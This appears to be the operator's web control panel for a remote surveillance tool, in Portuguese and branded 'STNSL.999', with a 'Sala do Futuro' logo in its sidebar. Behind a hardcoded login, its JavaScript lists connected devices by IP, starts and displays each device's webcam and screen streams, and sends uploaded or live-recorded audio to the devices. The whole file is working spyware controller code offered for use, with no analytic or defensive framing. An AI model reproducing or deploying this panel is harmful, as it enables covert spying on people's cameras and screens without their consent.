<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>STNSL.999 – Admin</title>

<!-- Bootstrap & FontAwesome -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">

<style>
/* Minimal-Hacker Soft v1.2 ───────────────────────────────── */
:root{--bg-1:#0e131a;--bg-2:#161c24;--stroke:#1f2731;--text:#d0d5dc;
      --muted:#8a94a3;--brand:#3ddcff;--radius:.6rem;
      --shadow:0 8px 24px -12px rgba(0,0,0,.6);
      --mono:'Fira Code',Consolas,Menlo,monospace;}
html,body{height:100%;margin:0;font-family:var(--mono);
          background:var(--bg-1);color:var(--text);-webkit-font-smoothing:antialiased;}
body.locked{overflow:hidden}
*::-webkit-scrollbar{width:6px;height:6px}
*::-webkit-scrollbar-thumb{background:var(--brand);border-radius:3px}

/* layout */
.navbar{background:var(--bg-2);border-bottom:1px solid var(--stroke);
        padding:.75rem 1.25rem;box-shadow:var(--shadow);}
.sidebar{background:var(--bg-2);width:240px;border-right:1px solid var(--stroke);
         overflow-y:auto;transition:width .25s;}
.sidebar.collapsed{width:68px}
.brand{padding:1.5rem 1rem .75rem;border-bottom:1px solid var(--stroke);
       text-align:center;}
.brand img{max-height:52px}

/* lista de dispositivos */
.list-group-item{display:flex;align-items:center;gap:.65rem;
                 padding:.55rem .7rem;margin:.12rem .5rem;font-size:.9rem;
                 border-radius:calc(var(--radius) - .25rem);
                 transition:background .15s;}
.list-group-item:hover{background:rgba(61,220,255,.08);}
.online-ip{color:#23d18b;}   /* verde  */
.offline-ip{color:#ffc107;}  /* amarelo */
.timer{font-size:.75rem;opacity:.75;}

/* viewer cards */
#viewer{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));
        gap:1.2rem;padding:1.5rem;}
.card-feed{position:relative;background:var(--bg-2);border:1px solid var(--stroke);
           border-radius:var(--radius);overflow:hidden;box-shadow:var(--shadow);
           transition:transform .2s,box-shadow .2s;}
.card-feed:hover{transform:translateY(-4px);
                 box-shadow:0 16px 28px -12px rgba(61,220,255,.25);}
.card-feed img{display:block;width:100%;height:170px;object-fit:cover;
               filter:brightness(.92);}
.card-feed .overlay{position:absolute;top:.4rem;left:.5rem;
                    padding:.2rem .6rem;font-size:.75rem;
                    background:rgba(0,0,0,.65);color:#fff;border-radius:.3rem;
                    text-transform:uppercase;letter-spacing:.04em;}
.card-feed .btn-bar{position:absolute;right:.6rem;bottom:.6rem;display:flex;gap:.4rem;}
.btn-glass{width:34px;height:34px;display:inline-flex;align-items:center;justify-content:center;
           background:rgba(61,220,255,.1);border:1px solid rgba(61,220,255,.28);
           color:var(--brand);border-radius:50%;backdrop-filter:blur(3px);
           transition:background .15s,border .15s;}
.btn-glass:hover{background:rgba(61,220,255,.18);
                 border-color:rgba(61,220,255,.45);}

/* telas iniciais */
@keyframes glow{0%,100%{text-shadow:0 0 4px var(--brand)}
                50%{text-shadow:0 0 8px var(--brand)}}
.flashing-title{animation:glow 1.6s infinite alternate;font-weight:700;}
#login{display:flex;align-items:center;justify-content:center;height:100vh;}
.login-card{width:320px;background:var(--bg-2);border:1px solid var(--stroke);
            border-radius:var(--radius);box-shadow:var(--shadow);padding:2rem 2.25rem;}
.login-card input{width:100%;background:var(--bg-1);border:1px solid var(--stroke);
                  border-radius:.4rem;padding:.5rem .75rem;color:var(--text);
                  font-family:var(--mono);font-size:.9rem;outline:none;
                  transition:border-color .2s;}
.login-card input:focus{border-color:var(--brand)}
#splash{position:fixed;inset:0;display:none;flex-direction:column;align-items:center;
        justify-content:center;background:#000;color:var(--brand);z-index:9999;}
#splash .skull{font-size:64px;animation:glow 2s infinite}
</style>
</head>

<body class="locked">
<!-- Splash ------------------------------------------------ -->
<div id="splash">
  <div class="skull"><i class="fas fa-skull"></i></div>
  <div class="text">STNSL.999 starting …</div>
</div>

<!-- Login ------------------------------------------------- -->
<div id="login">
  <div class="login-card w-100" style="max-width:420px">
    <h4 class="mb-3 flashing-title"><i class="fas fa-lock"></i> Acesso Restrito</h4>
    <input id="user" class="form-control mb-3" placeholder="Usuário">
    <input id="pass" type="password" class="form-control mb-3" placeholder="Senha">
    <button class="btn btn-primary w-100" onclick="login()">Entrar</button>
    <div id="error" class="text-danger mt-3 d-none">Usuário ou senha incorretos</div>
  </div>
</div>

<!-- Painel ------------------------------------------------ -->
<div id="painel" style="display:none;height:100vh">
  <nav class="navbar px-3 flex-shrink-0 justify-content-between">
    <span class="fw-semibold"><i class="fas fa-video-camera me-2"></i>Painel • STNSL.999</span>
    <div class="d-flex align-items-center gap-2">
      <button id="themeToggle" class="btn btn-glass" title="Alternar tema"><i id="themeIcon" class="fas fa-moon"></i></button>
      <div class="dropdown">
        <button class="btn btn-glass" data-bs-toggle="dropdown"><i class="fas fa-ellipsis-v"></i></button>
        <ul class="dropdown-menu dropdown-menu-end shadow">
          <li><a class="dropdown-item" href="https://manus.im/" target="_blank">MANUS.IM (teste)</a></li>
          <li><a class="dropdown-item" href="https://pastebin.com/raw/mNtFVJJa" target="_blank">Infos script</a></li>
        </ul>
      </div>
    </div>
  </nav>

  <div class="d-flex" style="height:calc(100% - 56px)">
    <!-- Sidebar -->
    <aside class="sidebar p-3">
      <div class="brand"><img src="https://i.imgur.com/At4HFM0.png" alt="Sala do Futuro"></div>
      <h6 class="fw-semibold mt-4">Dispositivos <span id="count" class="badge bg-primary">0</span></h6>
      <ul id="list" class="list-group list-group-flush small mt-2"></ul>
    </aside>

    <!-- Viewer -->
    <main class="flex-grow-1 p-4 overflow-auto">
      <div id="viewer" class="d-flex flex-wrap"></div>
    </main>
  </div>
</div>

<!-- Popup atualização ------------------------------------ -->
<div class="modal fade" id="updateModal" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content text-center">
      <div class="modal-body">
        <h5 class="mb-3">ATUALIZADO PARA VERSÃO&nbsp;2.0</h5>
        <button class="btn btn-primary px-4" data-bs-dismiss="modal">Fechar</button>
      </div>
    </div>
  </div>
</div>

<!-- Modal gravar áudio ------------------------------------ -->
<div class="modal fade" id="recordModal" tabindex="-1">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header border-0">
        <h5 class="modal-title">Gravar áudio</h5>
        <button class="btn-close" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body text-center">
        <button id="recordBtn" class="btn btn-danger"><i class="fas fa-microphone"></i> Gravar</button>
        <button id="stopBtn" class="btn btn-secondary d-none"><i class="fas fa-stop"></i> Parar</button>
      </div>
      <p class="small text-center text-muted mb-3">O áudio será enviado automaticamente após a gravação.</p>
    </div>
  </div>
</div>

<!-- Toasts -->
<div class="toast-container position-fixed top-0 end-0 p-3"></div>

<!-- Scripts ----------------------------------------------- -->
<script src="/socket.io/socket.io.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
/* ── Referências DOM & Estado ───────────────────────────── */
const socket = io({query:{role:'admin'}});
const listEl = document.getElementById('list'), countEl=document.getElementById('count');
const viewer = document.getElementById('viewer'), toastBox=document.querySelector('.toast-container');
const recordModal=new bootstrap.Modal('#recordModal'), updateModal=new bootstrap.Modal('#updateModal');
const recordBtn=document.getElementById('recordBtn'), stopBtn=document.getElementById('stopBtn');
const loginDiv=document.getElementById('login'), splash=document.getElementById('splash'), painel=document.getElementById('painel'), error=document.getElementById('error');

const clients={}, activeCam={}, activeScreen={};
let currentTargetUUID=null, mediaRecorder,chunks=[];

/* ── Tema ------------------------------------------------- */
const themeBtn=document.getElementById('themeToggle'), themeIcon=document.getElementById('themeIcon');
function updateIcon(){themeIcon.className=document.documentElement.classList.contains('dark')?'fas fa-sun':'fas fa-moon';}
themeBtn.onclick=()=>{document.documentElement.classList.toggle('dark');
                      localStorage.setItem('prefersDark',document.documentElement.classList.contains('dark'));updateIcon();}
if(localStorage.getItem('prefersDark')==='true'){document.documentElement.classList.add('dark');updateIcon();}

/* ── Login + splash + popup versão ------------------------ */
function login(){
  const u=document.getElementById('user').value.trim(),p=document.getElementById('pass').value.trim();
  if(u==='admin'&&p==='0312'){
    document.body.classList.remove('locked');
    loginDiv.style.display='none'; splash.style.display='flex';
    setTimeout(()=>{splash.style.display='none'; painel.style.display='block'; updateModal.show();},1400);
  }else error.classList.remove('d-none');
}

/* ── Utilidades ------------------------------------------ */
const toast=(msg,t='primary')=>{
  const d=document.createElement('div');
  d.className=`toast align-items-center text-white bg-${t} border-0`;
  d.innerHTML=`<div class="d-flex"><div class="toast-body">${msg}</div>
               <button class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button></div>`;
  toastBox.appendChild(d); bootstrap.Toast.getOrCreateInstance(d,{delay:2500}).show();
  d.addEventListener('hidden.bs.toast',()=>d.remove());
};
const fmt=n=>n<10?'0'+n:n, age=ms=>`${Math.floor(ms/60000)}m ${fmt(Math.floor(ms/1000)%60)}s`;

/* ── Lista de dispositivos -------------------------------- */
function row(c){
  const cls=c.online?'online-ip':'offline-ip';
  return `<li class="list-group-item" data-uuid="${c.uuid}" data-connected="${c.connected_at}" data-online="${c.online}">
    <i class="fas fa-eye"></i>
    <span class="${cls} fw-semibold">${c.ip}</span>
    <span class="timer ms-auto">${c.online?age(Date.now()-c.connected_at):'offline'}</span>
    ${c.online?`<div class="dropdown ms-2">
      <button class="btn btn-glass btn-sm" data-bs-toggle="dropdown"><i class="fas fa-ellipsis-v"></i></button>
      <ul class="dropdown-menu dropdown-menu-end shadow">
        <li><a class="dropdown-item toggle-cam"><i class="fas fa-video me-2"></i>Câmera</a></li>
        <li><a class="dropdown-item toggle-screen"><i class="fas fa-desktop me-2"></i>Tela</a></li>
        <li><hr class="dropdown-divider"></li>
        <li><a class="dropdown-item" href="https://pixabay.com/sound-effects/" target="_blank">
            <i class="fas fa-arrow-down me-2"></i>Baixar áudio</a></li>
        <li><a class="dropdown-item stop-audio"><i class="fas fa-volume-xmark me-2"></i>Parar áudio</a></li>
        <li><label class="dropdown-item"><i class="fas fa-upload me-2"></i>Enviar áudio
            <input type="file" accept="audio/*" class="audio-file d-none"></label></li>
        <li><a class="dropdown-item record-audio"><i class="fas fa-microphone-lines me-2"></i>Gravar & enviar</a></li>
      </ul></div>`:''}
  </li>`;
}
function renderList(){
  listEl.innerHTML='';
  Object.values(clients).sort((a,b)=>a.ip.localeCompare(b.ip))
        .forEach(c=>listEl.insertAdjacentHTML('beforeend',row(c)));
}

/* ── Timer (cada 1 s) ------------------------------------ */
setInterval(()=>{
  document.querySelectorAll('[data-online="true"] .timer').forEach(t=>{
    const li=t.closest('[data-uuid]'); t.textContent=age(Date.now()-li.dataset.connected);
  });
},1000);

/* ── Viewer cards ---------------------------------------- */
function mkCard(uuid,type){
  const c=clients[uuid];
  const card=document.createElement('div');
  card.className='card-feed'; card.id=`${type}-${uuid}`;
  card.innerHTML=`
    <div class="overlay">${c.ip} • ${type==='cam'?'Câmera':'Tela'}</div>
    <img id="${type==='cam'?'img':'screen-img'}-${uuid}">
    <div class="btn-bar">
      <button class="btn btn-glass btn-full"><i class="fas fa-expand"></i></button>
      <button class="btn btn-glass btn-stop"><i class="fas fa-xmark"></i></button>
    </div>`;
  /* full screen */
  card.querySelector('.btn-full').onclick=()=>{const img=card.querySelector('img');
    const onFs=()=>{if(document.fullscreenElement===card){img.style.width='100vw';img.style.height='100vh';img.style.objectFit='contain';}
                    else{img.style.width='';img.style.height='';img.style.objectFit='cover';
                         document.removeEventListener('fullscreenchange',onFs);}};
    document.addEventListener('fullscreenchange',onFs);
    (card.requestFullscreen||card.webkitRequestFullscreen||card.msRequestFullscreen).call(card);
  };
  /* stop */
  card.querySelector('.btn-stop').onclick=()=>{
    socket.emit(type==='cam'?'stop-stream':'stop-screen',uuid);
    delete (type==='cam'?activeCam:activeScreen)[uuid];
    card.remove();
  };
  viewer.appendChild(card);
}

/* ── Socket.IO ------------------------------------------- */
socket.on('clients',arr=>{
  const online=new Set(arr.map(c=>c.uuid));
  arr.forEach(c=>clients[c.uuid]={...c,online:true});
  Object.keys(clients).forEach(id=>{if(!online.has(id))clients[id].online=false;});
  countEl.textContent=arr.length;
  renderList();
});
socket.on('frame',({id,data})=>{
  const img=document.getElementById('img-'+id);
  if(img&&activeCam[id])img.src=data;
});
socket.on('screen-frame',({id,data})=>{
  const img=document.getElementById('screen-img-'+id);
  if(img&&activeScreen[id])img.src=data;
});

/* ── Sidebar actions ------------------------------------- */
listEl.addEventListener('click',e=>{
  const li=e.target.closest('[data-uuid]'); if(!li||li.dataset.online!=='true')return;
  const uuid=li.dataset.uuid;
  if(e.target.closest('.toggle-cam')){
    if(activeCam[uuid]){socket.emit('stop-stream',uuid);delete activeCam[uuid];document.getElementById('cam-'+uuid)?.remove();toast('Câmera parada','secondary');}
    else{socket.emit('request-stream',uuid);activeCam[uuid]=true;mkCard(uuid,'cam');toast('Câmera ativada','primary');}
  }
  if(e.target.closest('.toggle-screen')){
    if(activeScreen[uuid]){socket.emit('stop-screen',uuid);delete activeScreen[uuid];document.getElementById('screen-'+uuid)?.remove();toast('Tela parada','secondary');}
    else{socket.emit('request-screen',uuid);activeScreen[uuid]=true;mkCard(uuid,'screen');toast('Tela ativada','primary');}
  }
  if(e.target.closest('.stop-audio')){socket.emit('stop-audio',uuid);toast('Áudio parado','secondary');}
  if(e.target.closest('.record-audio')){currentTargetUUID=uuid;recordModal.show();}
});
listEl.addEventListener('change',e=>{
  if(e.target.classList.contains('audio-file')){
    const uuid=e.target.closest('[data-uuid]').dataset.uuid, f=e.target.files[0]; if(!f)return;
    const fr=new FileReader(); fr.onload=()=>{socket.emit('custom-audio',{uuid,dataURL:fr.result});toast('Áudio enviado','info');}; fr.readAsDataURL(f);
  }
});

/* ── Gravação de áudio ----------------------------------- */
recordBtn.onclick=async()=>{
  const stream=await navigator.mediaDevices.getUserMedia({audio:true});
  mediaRecorder=new MediaRecorder(stream); chunks=[];
  mediaRecorder.ondataavailable=e=>chunks.push(e.data);
  mediaRecorder.onstop=()=>{const blob=new Blob(chunks,{type:'audio/webm'}),fr=new FileReader();
    fr.onload=()=>{socket.emit('custom-audio',{uuid:currentTargetUUID,dataURL:fr.result});toast('Áudio gravado/enviado','success');recordModal.hide();};
    fr.readAsDataURL(blob);
  };
  mediaRecorder.start(); recordBtn.classList.add('d-none'); stopBtn.classList.remove('d-none');
};
stopBtn.onclick=()=>{mediaRecorder?.stop(); recordBtn.classList.remove('d-none'); stopBtn.classList.add('d-none');};
</script>
</body>
</html>
